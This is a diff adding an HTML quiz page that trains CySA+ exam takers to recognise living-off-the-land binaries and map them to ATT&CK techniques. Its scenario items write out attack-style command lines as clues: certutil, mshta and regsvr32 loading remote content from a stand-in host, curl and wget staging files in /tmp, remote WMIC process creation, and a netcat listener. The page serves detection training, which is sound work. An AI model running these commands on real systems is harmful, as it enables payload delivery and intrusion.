@@ -1,0 +1,247 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" type="image/png" href="../favicon.png">
+<title>CySA+ CS0-004 · LOLBins Recognition Trainer</title>
+<style>
+:root{
+  --accent:#1F6FB2;--accent2:#2E8B57;--purple:#7D3C98;--orange:#C56A16;--warn:#C0392B;
+  --bg:#f3f6fa;--panel:#fff;--panel2:#f8fafc;--border:#d7e0eb;--text:#102235;--muted:#52677d;
+  --chip:#edf3f8;--dash:#c6d2df;--good:#176b37;--goodbg:rgba(46,139,87,.14);--goodbd:rgba(46,139,87,.48);
+  --bad:#8f2424;--badbg:rgba(192,57,43,.12);--badbd:rgba(192,57,43,.48);--neutral:rgba(31,111,178,.08);
+  --selected:rgba(197,106,22,.12);--purplebg:rgba(125,60,152,.08);--orangebg:rgba(197,106,22,.09);
+  --shadow:0 1px 2px rgba(0,0,0,.04),0 6px 18px rgba(0,0,0,.045);
+}
+body.dark{
+  --bg:#0b1118;--panel:#111a24;--panel2:#0e1720;--border:#26374a;--text:#e8eef5;--muted:#9db0c4;
+  --chip:#172536;--dash:#31445a;--good:#7be49a;--goodbg:rgba(123,228,154,.10);--goodbd:rgba(123,228,154,.36);
+  --bad:#ff9494;--badbg:rgba(255,148,148,.09);--badbd:rgba(255,148,148,.35);--neutral:rgba(105,170,235,.09);
+  --selected:rgba(235,165,85,.12);--purplebg:rgba(180,120,220,.10);--orangebg:rgba(235,165,85,.10);
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 6px 18px rgba(0,0,0,.28);
+}
+*{box-sizing:border-box}html{scroll-behavior:smooth}
+body{margin:0;font-family:system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,Cantarell,Arial,sans-serif;color:var(--text);background:var(--bg);line-height:1.42}
+a{color:var(--accent)}button,select{font:inherit}
+header{position:sticky;top:0;z-index:40;display:flex;gap:9px;align-items:center;flex-wrap:wrap;padding:11px 15px;background:var(--panel);border-bottom:1px solid var(--border);box-shadow:var(--shadow)}
+h1{margin:0;font-size:clamp(1rem,2.3vw,1.28rem);color:var(--accent)}h1 .sub{font-size:.79em;font-weight:550;color:var(--muted);margin-left:7px}.spacer{flex:1}
+.pill{display:inline-block;background:var(--chip);border:1px solid var(--border);padding:3px 9px;border-radius:999px;font-size:.8rem;color:var(--muted);white-space:nowrap}
+button{cursor:pointer;background:var(--chip);color:var(--text);border:1px solid var(--border);border-radius:8px;padding:7px 10px}button:hover{border-color:var(--accent)}button.primary{background:var(--accent);border-color:var(--accent);color:#fff}button.danger{color:var(--warn)}
+main{max-width:1500px;margin:0 auto;padding:14px;display:grid;grid-template-columns:minmax(0,1fr) 385px;gap:14px;align-items:start}body.cheats-hidden main{grid-template-columns:1fr}body.cheats-hidden aside{display:none}
+.card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;box-shadow:var(--shadow)}
+.quiz-picker{display:flex;align-items:center;gap:8px;flex-wrap:wrap;padding-bottom:10px;border-bottom:1px solid var(--border);margin-bottom:10px}.quiz-picker label{font-weight:750;color:var(--muted);font-size:.86rem}.quiz-picker select{min-width:275px;background:var(--chip);color:var(--text);border:1px solid var(--border);border-radius:8px;padding:7px 9px}.quiz-desc{font-size:.82rem;color:var(--muted);flex:1;min-width:230px}
+.topline{display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;margin-bottom:8px}.progress-wrap{display:flex;gap:6px;flex-wrap:wrap}.section-badge{display:inline-block;padding:2px 8px;border-radius:999px;background:var(--neutral);border:1px solid var(--border);color:var(--accent);font-size:.74rem;font-weight:800;margin-right:5px}
+h2{font-size:1.03rem;color:var(--accent);margin:4px 0 7px}h3{font-size:.92rem;color:var(--accent2);margin:10px 0 5px}.hint{font-size:.83rem;color:var(--muted);margin:5px 0 10px}.tiny{font-size:.73rem;color:var(--muted)}
+.callout{font-size:.82rem;border-left:3px solid var(--accent);background:var(--neutral);padding:8px 9px;border-radius:6px;margin:8px 0}.callout.warn{border-left-color:var(--orange);background:var(--orangebg)}.callout.purple{border-left-color:var(--purple);background:var(--purplebg)}
+.direction-control{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:8px 0 10px;padding:8px 10px;background:var(--neutral);border:1px solid var(--border);border-radius:9px}.direction-control label{font-weight:750;color:var(--accent);font-size:.84rem}.direction-control select{background:var(--panel);color:var(--text);border:1px solid var(--border);border-radius:8px;padding:6px 8px}.direction-note{font-size:.78rem;color:var(--muted);flex:1;min-width:220px}
+.drag-layout{display:grid;grid-template-columns:minmax(0,1fr) 320px;gap:12px;align-items:start}.targets{display:grid;gap:8px}.target-row{display:grid;grid-template-columns:minmax(140px,.72fr) minmax(230px,1.6fr);gap:7px;align-items:stretch}.target-label{border:1px solid var(--border);background:var(--panel2);border-radius:8px;padding:8px 9px;display:flex;flex-direction:column;justify-content:center}.target-label .big{font-weight:850;color:var(--accent);font-size:.9rem;overflow-wrap:anywhere}.target-label .minor{font-size:.71rem;color:var(--muted);margin-top:2px}.target-label.reverse .big{color:var(--text);font-weight:650;line-height:1.33}
+.slot{min-height:58px;border:2px dashed var(--dash);border-radius:8px;padding:5px;background:var(--panel);display:flex;align-items:center;gap:5px;transition:.12s}.slot.over,.slot.tap-ready,.bucket.over,.bucket.tap-ready{border-color:var(--accent);background:var(--neutral)}.slot.correct,.bucket.correct{border-color:var(--goodbd);background:var(--goodbg)}.slot.wrong,.bucket.wrong{border-color:var(--badbd);background:var(--badbg)}.slot.empty-wrong::after{content:"Unanswered";color:var(--bad);font-size:.76rem;font-weight:700;padding-left:4px}
+.answer-tray{position:sticky;top:77px;border:1px solid var(--border);background:var(--panel2);border-radius:10px;padding:9px;max-height:calc(100vh - 94px);overflow:auto;box-shadow:var(--shadow)}.answer-tray h3{font-size:.8rem;margin:0 0 5px;color:var(--muted);text-transform:uppercase;letter-spacing:.045em}.pool{display:grid;gap:6px}.chip{border:1px solid var(--border);background:var(--chip);color:var(--text);border-radius:8px;padding:7px 8px;font-size:.83rem;line-height:1.3;user-select:none;cursor:grab;touch-action:manipulation;-webkit-tap-highlight-color:transparent}.chip:hover{border-color:var(--accent)}.chip.selected{outline:2px solid var(--orange);background:var(--selected)}.chip:active{cursor:grabbing}.chip.correct{background:var(--goodbg);border-color:var(--goodbd);color:var(--good)}.chip.wrong{background:var(--badbg);border-color:var(--badbd);color:var(--bad)}.chip.name{font-weight:800}.chip code{font-size:.8rem}
+.controls{display:flex;gap:7px;flex-wrap:wrap;margin-top:11px}.feedback{display:none;margin-top:10px;padding:10px;border:1px solid var(--border);border-radius:9px;background:var(--neutral);font-size:.86rem}.feedback.show{display:block}.feedback .scoreline{font-weight:850;color:var(--accent)}
+.bucket-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}.bucket{min-height:255px;border:2px dashed var(--dash);border-radius:10px;padding:9px;background:var(--panel2)}.bucket h3{margin:0 0 3px;color:var(--accent);font-size:.94rem}.bucket .bucket-note{font-size:.74rem;color:var(--muted);margin-bottom:7px}.bucket .chip{margin:3px;display:inline-block}.sort-bank{display:flex;flex-wrap:wrap;gap:7px;padding:10px;border:1px dashed var(--dash);border-radius:9px;background:var(--chip);min-height:60px}.sort-bank .bank-label{width:100%;font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.05em}
+.mcq-list{display:grid;gap:10px}.mcq{border:1px solid var(--border);border-radius:10px;padding:11px;background:var(--panel2)}.mcq-q{font-weight:760;font-size:.88rem;margin-bottom:7px}.cmd{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:var(--chip);border:1px solid var(--border);border-radius:7px;padding:7px 8px;margin:5px 0 8px;overflow-wrap:anywhere;font-size:.81rem}.mcq-opts{display:grid;grid-template-columns:1fr 1fr;gap:6px}.opt{text-align:left;border:1px solid var(--border);background:var(--panel);color:var(--text);border-radius:8px;padding:8px;cursor:pointer;font-size:.82rem}.opt:hover{border-color:var(--accent)}.opt.correct{background:var(--goodbg);border-color:var(--goodbd);color:var(--good)}.opt.wrong{background:var(--badbg);border-color:var(--badbd);color:var(--bad)}.mcq-why{display:none;margin-top:8px;border-left:3px solid var(--accent);padding:7px 8px;background:var(--panel);border-radius:6px;font-size:.79rem;color:var(--muted)}.mcq-why.show{display:block}.mcq-why b{color:var(--text)}
+aside .card{position:sticky;top:77px;max-height:calc(100vh - 94px);overflow:auto}aside h2{margin:0 0 7px;color:var(--accent);font-size:1rem}details{border-top:1px solid var(--border);padding:6px 0}details:first-of-type{border-top:0}summary{cursor:pointer;color:var(--accent);font-weight:770;font-size:.88rem}.ref-table{width:100%;border-collapse:collapse;font-size:.74rem;margin-top:6px}.ref-table th,.ref-table td{border:1px solid var(--border);padding:5px;vertical-align:top;text-align:left}.ref-table th{background:var(--chip)}.ref-table code{font-size:.72rem}.attack-link{font-weight:800;text-decoration:none}.attack-link:hover{text-decoration:underline}.ext-links{display:grid;gap:6px;margin-top:7px}.ext-links a{display:block;padding:7px 8px;border:1px solid var(--border);border-radius:8px;background:var(--panel2);text-decoration:none;font-weight:750;font-size:.8rem}.ext-links a:hover{border-color:var(--accent)}
+.hidden{display:none!important}.trainer-footer{max-width:1500px;margin:0 auto;padding:2px 14px 20px;display:flex;justify-content:center;gap:14px;flex-wrap:wrap;color:var(--muted);font-size:.78rem}.trainer-footer a{text-decoration:none}.trainer-footer a:hover{text-decoration:underline}
+@media(max-width:1180px){main{grid-template-columns:1fr}aside .card{position:static;max-height:none}.drag-layout{grid-template-columns:minmax(0,1fr) 285px}}
+@media(max-width:800px){header{position:static}.drag-layout{display:block}.answer-tray{position:sticky;top:auto;bottom:6px;max-height:38vh;margin-top:9px;z-index:25}.target-row{grid-template-columns:120px minmax(0,1fr)}.bucket-grid{grid-template-columns:1fr 1fr}.mcq-opts{grid-template-columns:1fr}.quiz-picker select{min-width:100%;width:100%}}
+@media(max-width:520px){main{padding:8px}.card{padding:10px}.target-row{grid-template-columns:1fr}.bucket-grid{grid-template-columns:1fr}.bucket{min-height:155px}.quiz-picker label{display:none}}
+</style>
+</head>
+<body>
+<header>
+  <h1>CySA+ CS0-004 · LOLBins Trainer <span class="sub">Living Off the Land Recognition</span></h1>
+  <span class="spacer"></span>
+  <span class="pill">Current: <b id="scorePill">Not graded</b></span>
+  <button id="cheatBtn" type="button">📚 Hide Cheats</button>
+  <button id="darkBtn" type="button">🌙 Dark</button>
+  <button id="resetBtn" type="button">Reset Quiz</button>
+</header>
+
+<main>
+<section><div class="card">
+  <div class="quiz-picker">
+    <label for="quizSelect">Quiz:</label>
+    <select id="quizSelect">
+      <option value="windows" selected>1 · Windows LOLBins — Match</option>
+      <option value="linux">2 · Linux LOLBins — Match</option>
+      <option value="platform">3 · Mixed — Windows vs Linux</option>
+      <option value="scenarios">4 · Mixed — Identify the LOLBin</option>
+    </select>
+    <div class="quiz-desc" id="quizDesc"></div>
+  </div>
+  <div class="topline">
+    <div><span class="section-badge" id="sectionBadge">Windows core</span><strong id="quizTitle">Windows LOLBins</strong></div>
+    <div class="progress-wrap"><span class="pill" id="coveragePill">All items shown</span></div>
+  </div>
+  <div id="quizHost"></div>
+</div></section>
+
+<aside id="cheatPanel"><div class="card">
+  <h2>LOLBins Cheat Sheet</h2>
+  <div class="callout"><b>Core idea:</b> the binary can be legitimate and signed. The suspicious part is the <b>behavior</b>: unusual network access, decoding, remote execution, persistence, or unexpected child processes.</div>
+
+  <details open>
+    <summary>Windows — Dion core set</summary>
+    <table class="ref-table">
+      <tr><th>LOLBIN</th><th>Exam recognition cue</th></tr>
+      <tr><td><b>PowerShell</b></td><td><code>-EncodedCommand</code>, execution-policy bypass, IEX/WebClient downloads, odd parent such as Office.</td></tr>
+      <tr><td><b>certutil.exe</b></td><td>Certificate utility abused to <b>download</b> or <b>Base64 decode</b> files.</td></tr>
+      <tr><td><b>WMI / WMIC</b></td><td>Remote execution, lateral movement, WMI event-subscription persistence; Sysmon 19/20/21 are high-value clues.</td></tr>
+      <tr><td><b>mshta.exe</b></td><td>Trusted Windows HTML Application host used to execute HTA/JavaScript/VBScript and proxy execution.</td></tr>
+      <tr><td><b>regsvr32.exe</b></td><td>Trusted registration utility abused to proxy-execute DLL/scriptlet content and bypass application controls.</td></tr>
+    </table>
+    <div class="callout purple"><b>Dion memory aid:</b> W-C-M-R — Windows scripting via PowerShell, Certutil, WMI, and registry-adjacent/proxy tools such as mshta/regsvr32.</div>
+  </details>
+
+  <details open>
+    <summary>Linux — Dion core examples</summary>
+    <table class="ref-table">
+      <tr><th>Tool</th><th>Exam recognition cue</th></tr>
+      <tr><td><b>curl</b></td><td>Command-line data transfer; suspicious when a shell downloads a payload to a temp/user path.</td></tr>
+      <tr><td><b>wget</b></td><td>Command-line downloader; same high-value chain: network connection → new file → execution.</td></tr>
+      <tr><td><b>nc / netcat</b></td><td>General TCP/UDP connection/listener utility; can create raw socket channels and support remote shells.</td></tr>
+    </table>
+    <div class="callout warn"><b>Platform trap:</b> these are <i>Dion exam buckets</i>, not absolute compatibility boundaries. Some tools are cross-platform or available on modern Windows.</div>
+  </details>
+
+  <details open>
+    <summary>MITRE ATT&amp;CK quick map</summary>
+    <table class="ref-table">
+      <tr><th>ID</th><th>Use here</th></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener noreferrer">T1059.001</a></td><td>PowerShell execution.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1047/" target="_blank" rel="noopener noreferrer">T1047</a></td><td>Windows Management Instrumentation.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1218/005/" target="_blank" rel="noopener noreferrer">T1218.005</a></td><td>System Binary Proxy Execution: Mshta.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1218/010/" target="_blank" rel="noopener noreferrer">T1218.010</a></td><td>System Binary Proxy Execution: Regsvr32.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noopener noreferrer">T1105</a></td><td>Ingress Tool Transfer — useful for certutil, curl, wget, and PowerShell download behavior.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1140/" target="_blank" rel="noopener noreferrer">T1140</a></td><td>Decode/deobfuscate files — high-yield certutil <code>-decode</code> mapping.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1095/" target="_blank" rel="noopener noreferrer">T1095</a></td><td>Non-Application Layer Protocol — useful when netcat is used for raw TCP/UDP C2-style communication.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1059/003/" target="_blank" rel="noopener noreferrer">T1059.003</a></td><td>Windows Command Shell; related shell context, not one of Dion's core five Windows LOLBins here.</td></tr>
+      <tr><td><a class="attack-link" href="https://attack.mitre.org/techniques/T1059/004/" target="_blank" rel="noopener noreferrer">T1059.004</a></td><td>Unix Shell; related to Linux shell execution chains.</td></tr>
+    </table>
+  </details>
+
+  <details>
+    <summary>Behavior-based detection clues</summary>
+    <ul class="tiny">
+      <li>Built-in process suddenly makes an external network connection.</li>
+      <li>Download is followed by file creation in Temp, <code>/tmp</code>, AppData, or another user-writable location.</li>
+      <li>Encoded/obfuscated command-line arguments appear.</li>
+      <li>Trusted binary spawns a scripting engine or unexpected shell.</li>
+      <li>Office/browser/email process launches PowerShell or command shell.</li>
+      <li>WMI persistence appears in Sysmon Event IDs 19, 20, or 21.</li>
+    </ul>
+  </details>
+
+  <details open>
+    <summary>External reference sites</summary>
+    <div class="ext-links">
+      <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">↗ LOLBAS — Windows Living Off The Land Binaries, Scripts &amp; Libraries</a>
+      <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">↗ GTFOBins — Unix/Linux counterpart</a>
+    </div>
+  </details>
+
+  <div class="tiny" style="margin-top:9px">Source focus: Dion Training CySA+ CS0-004 Course Notes, Host-Related IoC / LOLBins section. ATT&amp;CK links are supporting authoritative references.</div>
+</div></aside>
+</main>
+
+<footer class="trainer-footer">
+  <a href="../index.html">← Study Materials</a>
+  <a href="https://github.com/UGL13RTH4NU/CySA-004" target="_blank" rel="noopener noreferrer">↗ Project Repository on GitHub</a>
+</footer>
+
+<script>
+'use strict';
+const WINDOWS=[
+ {id:'powershell',name:'PowerShell / powershell.exe',platform:'Windows',def:'Powerful command and scripting environment. Abuse cues include encoded commands, execution-policy bypass, in-memory/script execution, downloads, and unusual parent processes such as Office.',attack:[['T1059.001','https://attack.mitre.org/techniques/T1059/001/'],['T1105','https://attack.mitre.org/techniques/T1105/']]},
+ {id:'certutil',name:'certutil.exe',platform:'Windows',def:'Legitimate certificate utility that attackers can abuse to download files or encode/decode Base64 content. Watch for -urlcache, -split, -f, -decode, and external URLs.',attack:[['T1105','https://attack.mitre.org/techniques/T1105/'],['T1140','https://attack.mitre.org/techniques/T1140/']]},
+ {id:'wmi',name:'WMI / WMIC',platform:'Windows',def:'Windows management infrastructure that can be abused for remote execution, lateral movement, discovery, and stealthy event-subscription persistence.',attack:[['T1047','https://attack.mitre.org/techniques/T1047/']]},
+ {id:'mshta',name:'mshta.exe',platform:'Windows',def:'Microsoft HTML Application host. Attackers can proxy execution of HTA files and JavaScript/VBScript through this trusted Windows binary, often defeating weak allowlisting.',attack:[['T1218.005','https://attack.mitre.org/techniques/T1218/005/']]},
+ {id:'regsvr32',name:'regsvr32.exe',platform:'Windows',def:'Windows registration utility for DLL/COM components. Attackers can abuse it to proxy-execute malicious DLL or scriptlet content and bypass application-control rules.',attack:[['T1218.010','https://attack.mitre.org/techniques/T1218/010/']]}
+];
+const LINUX=[
+ {id:'curl',name:'curl',platform:'Linux',def:'Command-line data transfer tool. In a LOLBin chain it often retrieves remote content; suspicious context is an external connection followed by a new payload in a temp or user-writable path.',attack:[['T1105','https://attack.mitre.org/techniques/T1105/']]},
+ {id:'wget',name:'wget',platform:'Linux',def:'Command-line downloader commonly used to retrieve files over HTTP/HTTPS. Watch for downloads into /tmp or other staging paths followed by execution.',attack:[['T1105','https://attack.mitre.org/techniques/T1105/']]},
+ {id:'nc',name:'nc / netcat',platform:'Linux',def:'General-purpose TCP/UDP networking utility that can connect to or listen on ports. Attackers can use it for raw socket communications and as plumbing for remote shells.',attack:[['T1095','https://attack.mitre.org/techniques/T1095/']]}
+];
+const ALL=[...WINDOWS,...LINUX];
+const SCENARIOS=[
+ {id:'s1',q:'Which LOLBin best matches this command-line clue?',cmd:'powershell.exe -EncodedCommand <base64-data>',a:'powershell',why:'Dion specifically flags -EncodedCommand as a high-value malicious PowerShell indicator. ATT&CK: T1059.001.'},
+ {id:'s2',q:'Which LOLBin is most directly indicated by this behavior?',cmd:'WINWORD.EXE → powershell.exe → outbound HTTPS connection',a:'powershell',why:'The suspicious parent-child relationship plus PowerShell network behavior is a classic living-off-the-land chain.'},
+ {id:'s3',q:'Which LOLBin is being abused here?',cmd:'certutil -urlcache -split -f https://example.invalid/file.bin payload.bin',a:'certutil',why:'Dion explicitly calls out certutil download behavior. The transfer maps naturally to ATT&CK T1105.'},
+ {id:'s4',q:'Which LOLBin best fits this clue?',cmd:'certutil -decode staged.txt payload.exe',a:'certutil',why:'certutil can decode Base64 content; MITRE maps this abuse to T1140.'},
+ {id:'s5',q:'Which Windows LOLBin is the best match?',cmd:'Sysmon Event IDs 19, 20, and 21 show a new event filter, consumer, and binding.',a:'wmi',why:'Dion specifically ties Sysmon 19/20/21 to WMI event-subscription persistence.'},
+ {id:'s6',q:'Which LOLBin is most associated with this remote-management abuse?',cmd:'wmic /node:REMOTEHOST process call create "cmd.exe /c ..."',a:'wmi',why:'WMI/WMIC can be abused for remote process creation and lateral movement. ATT&CK: T1047.'},
+ {id:'s7',q:'Which LOLBin is most directly indicated?',cmd:'mshta.exe https://example.invalid/update.hta',a:'mshta',why:'mshta is a trusted Windows HTML Application host that can proxy execution of remote HTA/script content. ATT&CK: T1218.005.'},
+ {id:'s8',q:'Which LOLBin best fits this application-control-bypass pattern?',cmd:'regsvr32.exe /s /n /u /i:https://example.invalid/file.sct scrobj.dll',a:'regsvr32',why:'regsvr32 can proxy execution of scriptlet content and is explicitly mapped to ATT&CK T1218.010.'},
+ {id:'s9',q:'Which Dion Linux LOLBin is shown?',cmd:'curl -o /tmp/update.bin https://example.invalid/update.bin',a:'curl',why:'curl is one of Dion’s explicit Linux LOLBin examples; external transfer into /tmp is a behavior-based clue. ATT&CK: T1105.'},
+ {id:'s10',q:'Which Dion Linux LOLBin is shown?',cmd:'wget https://example.invalid/tool -O /tmp/tool',a:'wget',why:'wget is an explicit Dion Linux LOLBin example and a common ingress-tool-transfer utility. ATT&CK: T1105.'},
+ {id:'s11',q:'Which Dion Linux LOLBin best matches this clue?',cmd:'nc -l -p 4444',a:'nc',why:'Netcat can listen on TCP/UDP ports and is useful for raw socket channels. In C2-style use, T1095 is a useful ATT&CK association.'},
+ {id:'s12',q:'An analyst sees a Microsoft-signed binary making an unusual external connection and creating a file in Temp. What is the BEST first principle?',cmd:'The signature is valid; the behavior is abnormal.',a:'behavior',why:'LOLBins are legitimate tools. Signature-based trust alone is insufficient; correlate process, network, file, parent, and command-line behavior.'}
+];
+const META={
+ windows:{title:'Windows LOLBins',badge:'Windows core',desc:'Match Dion’s core Windows LOLBins to their abuse patterns. Default direction tests recognition from behavior to tool name.'},
+ linux:{title:'Linux LOLBins',badge:'Linux core',desc:'Match Dion’s explicit Linux LOLBin examples — curl, wget, and nc — to what their abuse looks like.'},
+ platform:{title:'Windows vs Linux — Dion exam bucket',badge:'Mixed platform',desc:'Mix the core names and sort them into the Windows or Linux bucket used by Dion’s CySA+ notes. This is not an absolute OS-compatibility rule.'},
+ scenarios:{title:'Identify the LOLBin from behavior',badge:'Exam recognition',desc:'Short command/process clues. Questions are presented without replacement so every scenario appears before the cycle repeats.'}
+};
+let current='windows',selectedChip=null,scenarioDeck=[],scenarioCursor=0,scenarioAnswered=new Set();
+const $=s=>document.querySelector(s); const host=$('#quizHost');
+function shuffle(a){const x=[...a];for(let i=x.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[x[i],x[j]]=[x[j],x[i]];}return x}
+function clearSelected(){if(selectedChip)selectedChip.classList.remove('selected');selectedChip=null;document.querySelectorAll('.tap-ready').forEach(x=>x.classList.remove('tap-ready'))}
+function setScore(t){$('#scorePill').textContent=t}
+function resetVisualGrades(root=document){root.querySelectorAll('.correct,.wrong,.empty-wrong').forEach(x=>x.classList.remove('correct','wrong','empty-wrong'))}
+function attackHTML(item){return item.attack.map(([id,url])=>`<a class="attack-link" href="${url}" target="_blank" rel="noopener noreferrer">${id}</a>`).join(' · ')}
+function makeChip(item,text,type='answer'){
+ const c=document.createElement('div');c.className='chip'+(text===item.name?' name':'');c.draggable=true;c.dataset.id=item.id;c.dataset.type=type;c.innerHTML=text;
+ c.addEventListener('dragstart',e=>{clearSelected();e.dataTransfer.setData('text/plain',item.id);e.dataTransfer.effectAllowed='move';c.classList.add('dragging')});
+ c.addEventListener('dragend',()=>c.classList.remove('dragging'));
+ c.addEventListener('click',e=>{e.stopPropagation();if(c.parentElement.classList.contains('slot')||c.parentElement.classList.contains('bucket')){returnHome(c);return} if(selectedChip===c){clearSelected();return} clearSelected();selectedChip=c;c.classList.add('selected');document.querySelectorAll('.slot,.bucket').forEach(z=>z.classList.add('tap-ready'))});
+ return c;
+}
+function returnHome(chip){resetVisualGrades();const bank=document.querySelector('[data-home-bank="true"]');if(bank)bank.appendChild(chip);clearSelected();setScore('Not graded')}
+function setupDropZone(z,acceptMany=false){
+ z.addEventListener('dragover',e=>{e.preventDefault();z.classList.add('over')});z.addEventListener('dragleave',()=>z.classList.remove('over'));
+ z.addEventListener('drop',e=>{e.preventDefault();z.classList.remove('over');const id=e.dataTransfer.getData('text/plain');const chip=[...document.querySelectorAll('.chip')].find(c=>c.dataset.id===id);if(chip)place(chip,z,acceptMany)});
+ z.addEventListener('click',()=>{if(selectedChip)place(selectedChip,z,acceptMany)});
+}
+function place(chip,z,acceptMany){resetVisualGrades();if(!acceptMany){const old=z.querySelector('.chip');if(old&&old!==chip)returnHome(old)}z.appendChild(chip);clearSelected();setScore('Not graded')}
+function renderMatch(items,key){
+ const wrap=document.createElement('div');const dir=document.createElement('div');dir.className='direction-control';dir.innerHTML=`<label for="directionSelect">Direction:</label><select id="directionSelect"><option value="forward">Definition → LOLBin</option><option value="reverse">LOLBIN → Definition</option></select><span class="direction-note" id="directionNote">Descriptions move; LOLBin names are the destinations.</span>`;wrap.appendChild(dir);
+ const body=document.createElement('div');wrap.appendChild(body);host.replaceChildren(wrap);
+ function draw(){
+  clearSelected();const reverse=$('#directionSelect').value==='reverse';body.innerHTML=`<h2>${reverse?'Match each LOLBin name to what it does.':'Identify the LOLBin from what it does.'}</h2><p class="hint">Drag normally, or tap/click an answer once and then tap/click its destination. Tap/click a placed answer to return it to the tray. Score at any time, change answers, and re-score.</p><div class="drag-layout"><div class="targets" id="targets"></div><div class="answer-tray"><h3>${reverse?'LOLBIN names':'Behavior / function pool'}</h3><div class="pool" id="answerPool" data-home-bank="true"></div></div></div><div class="controls"><button class="primary" id="checkMatch">Score / Re-score</button><button id="shuffleMatch">Shuffle Pool</button><button id="resetMatch">Reset Board</button></div><div class="feedback" id="feedback"></div>`;
+  const targets=$('#targets'),pool=$('#answerPool');
+  items.forEach(it=>{const row=document.createElement('div');row.className='target-row';const label=document.createElement('div');label.className='target-label'+(reverse?' reverse':'');label.innerHTML=reverse?`<div class="big">${it.def}</div><div class="minor">ATT&amp;CK: ${attackHTML(it)}</div>`:`<div class="big">${it.name}</div><div class="minor">ATT&amp;CK: ${attackHTML(it)}</div>`;const slot=document.createElement('div');slot.className='slot';slot.dataset.answer=it.id;setupDropZone(slot,false);row.append(label,slot);targets.appendChild(row)});
+  shuffle(items).forEach(it=>pool.appendChild(makeChip(it,reverse?it.name:it.def)));
+  $('#checkMatch').onclick=()=>gradeMatch();$('#shuffleMatch').onclick=()=>{const chips=shuffle([...pool.children]);chips.forEach(c=>pool.appendChild(c))};$('#resetMatch').onclick=draw;
+  $('#directionNote').textContent=reverse?'LOLBIN names move; descriptions are the destinations.':'Descriptions move; LOLBin names are the destinations.';
+ }
+ $('#directionSelect').addEventListener('change',draw);draw();
+ function gradeMatch(){resetVisualGrades(body);let correct=0,placed=0;body.querySelectorAll('.slot').forEach(s=>{const c=s.querySelector('.chip');if(!c){s.classList.add('empty-wrong');return}placed++;if(c.dataset.id===s.dataset.answer){c.classList.add('correct');s.classList.add('correct');correct++}else{c.classList.add('wrong');s.classList.add('wrong')}});setScore(`${correct} / ${items.length}`);const f=$('#feedback');f.classList.add('show');f.innerHTML=`<div class="scoreline">${correct} of ${items.length} correctly placed.</div>${placed<items.length?` ${items.length-placed} answer${items.length-placed===1?' is':'s are'} still unplaced.`:''} Move anything you want and score again.`}
+}
+function renderPlatform(){
+ host.innerHTML=`<h2>Sort the core names into Dion’s Windows vs Linux exam bucket.</h2><p class="hint">This tests the course grouping, not strict platform exclusivity. Drag, or tap/click a name and then a bucket. Tap/click a placed name to return it to the pool.</p><div class="sort-bank" id="sortBank" data-home-bank="true"><div class="bank-label">Mixed LOLBin pool</div></div><div class="bucket-grid" style="margin-top:10px"><div class="bucket" id="winBucket" data-platform="Windows"><h3>Windows — Dion core</h3><div class="bucket-note">PowerShell, certutil, WMI/WMIC, mshta, regsvr32</div></div><div class="bucket" id="linBucket" data-platform="Linux"><h3>Linux — Dion examples</h3><div class="bucket-note">curl, wget, nc/netcat</div></div></div><div class="controls"><button class="primary" id="checkSort">Score / Re-score</button><button id="shuffleSort">Shuffle Pool</button><button id="resetSort">Reset Board</button></div><div class="feedback" id="feedback"></div>`;
+ const bank=$('#sortBank');shuffle(ALL).forEach(it=>bank.appendChild(makeChip(it,it.name)));setupDropZone($('#winBucket'),true);setupDropZone($('#linBucket'),true);
+ $('#checkSort').onclick=()=>{resetVisualGrades(host);let correct=0,placed=0;document.querySelectorAll('.bucket .chip').forEach(c=>{placed++;const it=ALL.find(x=>x.id===c.dataset.id),b=c.closest('.bucket');if(it.platform===b.dataset.platform){c.classList.add('correct');correct++}else c.classList.add('wrong')});setScore(`${correct} / ${ALL.length}`);const f=$('#feedback');f.classList.add('show');f.innerHTML=`<div class="scoreline">${correct} of ${ALL.length} correctly classified.</div>${placed<ALL.length?` ${ALL.length-placed} remain in the pool.`:''} Remember: this is the source-aligned exam grouping.`};
+ $('#shuffleSort').onclick=()=>{shuffle([...bank.querySelectorAll('.chip')]).forEach(c=>bank.appendChild(c))};$('#resetSort').onclick=renderPlatform;
+}
+function scenarioOptions(s){if(s.a==='behavior')return shuffle([{id:'behavior',name:'Use behavior-based correlation; the signed binary can still be abused.'},{id:'signature',name:'Trust the binary because the Microsoft signature is valid.'},{id:'hash',name:'Treat every signed OS binary as clean unless its hash changes.'},{id:'block',name:'Block every built-in administrative utility by filename.'}]);const correct=ALL.find(x=>x.id===s.a);const distract=shuffle(ALL.filter(x=>x.id!==s.a)).slice(0,3);return shuffle([correct,...distract]).map(x=>({id:x.id,name:x.name}))}
+function freshScenarioDeck(){scenarioDeck=shuffle(SCENARIOS);scenarioCursor=0;scenarioAnswered.clear()}
